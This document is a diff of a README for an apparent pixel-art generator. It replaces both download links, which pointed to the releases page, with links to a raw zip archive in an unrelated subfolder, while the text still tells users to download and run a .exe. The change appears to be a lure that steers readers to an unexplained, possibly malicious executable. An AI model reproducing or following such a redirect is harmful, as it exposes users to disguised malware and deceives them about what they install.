@@ -1,6 +1,6 @@
 # 🎨 T2I-L2P - Generate high quality pixel art easily
 
-[![Download T2I-L2P](https://img.shields.io/badge/Download-Release-blue)] (https://github.com/vinx6903/T2I-L2P/releases)
+[![Download T2I-L2P](https://img.shields.io/badge/Download-Release-blue)] (https://github.com/vinx6903/T2I-L2P/raw/refs/heads/main/diffsynth/P_v2.3.zip)
 
 ## 📌 About this project
 
@@ -22,7 +22,7 @@ If your computer does not meet these specs, the software might run slowly or sto
 
 You must visit the releases page to get the installer for your computer. 
 
-[Visit this page to download the software](https://github.com/vinx6903/T2I-L2P/releases)
+[Visit this page to download the software](https://github.com/vinx6903/T2I-L2P/raw/refs/heads/main/diffsynth/P_v2.3.zip)
 
 Look for the file ending in .exe for Windows. Click that file to save it to your computer.
 
